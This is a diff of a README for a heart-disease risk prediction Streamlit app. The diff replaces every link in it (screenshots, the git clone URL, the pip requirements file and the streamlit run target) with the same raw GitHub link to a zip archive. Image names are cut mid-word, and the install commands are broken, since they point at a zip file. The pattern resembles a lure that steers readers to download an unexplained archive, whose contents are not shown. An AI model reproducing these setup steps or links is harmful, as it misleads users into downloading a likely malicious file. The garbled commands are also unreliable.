@@ -24,14 +24,14 @@ Target Variable: TenYearCHD (1: High risk, 0: Low risk)
 
 **System Architecture
 
-images/system architecture.png
+images/system https://raw.githubusercontent.com/VM-Janani/Heart_disease_risk_-prediction/main/unexiled/Heart_disease_risk_-prediction.zip
 
 💻 Installation & Setup
 bash
 Copy
 Edit
 # 1. Clone the repo
-git clone https://github.com/your-username/heart-disease-prediction.git
+git clone https://raw.githubusercontent.com/VM-Janani/Heart_disease_risk_-prediction/main/unexiled/Heart_disease_risk_-prediction.zip
 cd heart-disease-prediction
 
 # 2. Create a virtual environment and activate it
@@ -39,10 +39,10 @@ python -m venv venv
 source venv/bin/activate    # On Windows: venv\Scripts\activate
 
 # 3. Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/VM-Janani/Heart_disease_risk_-prediction/main/unexiled/Heart_disease_risk_-prediction.zip
 
 # 4. Run the Streamlit app
-streamlit run app.py
+streamlit run https://raw.githubusercontent.com/VM-Janani/Heart_disease_risk_-prediction/main/unexiled/Heart_disease_risk_-prediction.zip
 🧾 How to Use
 Home Page – Learn about heart disease, machine learning, and the recommendation engine.
 
@@ -74,16 +74,16 @@ F1-Score	High 88
 🖼️ Result Screenshots
 recommendation results
 
-images/recommedation 2.png 
+images/recommedation https://raw.githubusercontent.com/VM-Janani/Heart_disease_risk_-prediction/main/unexiled/Heart_disease_risk_-prediction.zip 
 
-images/recommedation 1.png
+images/recommedation https://raw.githubusercontent.com/VM-Janani/Heart_disease_risk_-prediction/main/unexiled/Heart_disease_risk_-prediction.zip
 
-images/recommedation.png
+https://raw.githubusercontent.com/VM-Janani/Heart_disease_risk_-prediction/main/unexiled/Heart_disease_risk_-prediction.zip
 
 prediction results
 
-images/high risk.png 
+images/high https://raw.githubusercontent.com/VM-Janani/Heart_disease_risk_-prediction/main/unexiled/Heart_disease_risk_-prediction.zip 
 
-images/low risk.png
+images/low https://raw.githubusercontent.com/VM-Janani/Heart_disease_risk_-prediction/main/unexiled/Heart_disease_risk_-prediction.zip
 
 
